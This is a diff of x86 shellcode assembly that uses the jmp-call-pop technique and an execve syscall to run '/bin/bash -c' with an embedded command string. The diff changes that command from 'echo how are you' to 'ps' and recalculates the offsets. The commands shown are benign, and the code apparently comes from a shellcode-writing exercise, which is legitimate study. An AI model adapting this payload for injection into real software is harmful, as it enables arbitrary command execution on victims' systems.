@@ -10,23 +10,23 @@ xor             eax, eax          ; I believe eax is now NULL
 ; store stuff
 mov byte        [esi + 9], al     ; terminate /bin/bash
 mov byte        [esi + 12], al    ; terminate -c
-mov byte        [esi + 29], al    ; terminate /bin/shi -i ... 
+mov byte        [esi + 15], al    ; terminate /bin/shi -i ... 
 
 ; move stuff
-mov long        [esi + 30], esi   ; address of /bin/bash in AAAA
-lea             ebx, [esi + 9]    ; get address of -c  
-mov long        [esi + 34], ebx   ; store address of -c in BBBB 
-lea             ebx, [esi + 12]   ; get address of /bin/bash -i ... 
-mov long        [esi + 38], ebx   ; store address of /bin/bash -i ... in CCCC
-mov long        [esi + 42], eax   ; put NULL in DDDD
+mov long        [esi + 16], esi   ; address of /bin/bash in AAAA
+lea             ebx, [esi + 10]    ; get address of -c  
+mov long        [esi + 20], ebx   ; store address of -c in BBBB 
+lea             ebx, [esi + 13]   ; get address of /bin/bash -i ... 
+mov long        [esi + 24], ebx   ; store address of /bin/bash -i ... in CCCC
+mov long        [esi + 28], eax   ; put NULL in DDDD
 
 ; running stuff
 mov byte        al, 0x0b          ; pass the execve syscall number as argument
 mov             ebx, esi          
-lea             ecx, [esi + 30]   ; /bin/bash -c /bin/bash ....
-lea             edx, [esi + 42]   ; NULL
+lea             ecx, [esi + 16]   ; /bin/bash -c /bin/bash ....
+lea             edx, [esi + 28]   ; NULL
 int             0x80              ; Run the execve syscall
 
 forward:
 call            back
-db "/bin/bash#-c#echo how are you#AAAABBBBCCCCDDDD"
+db "/bin/bash#-c#ps#AAAABBBBCCCCDDDD"
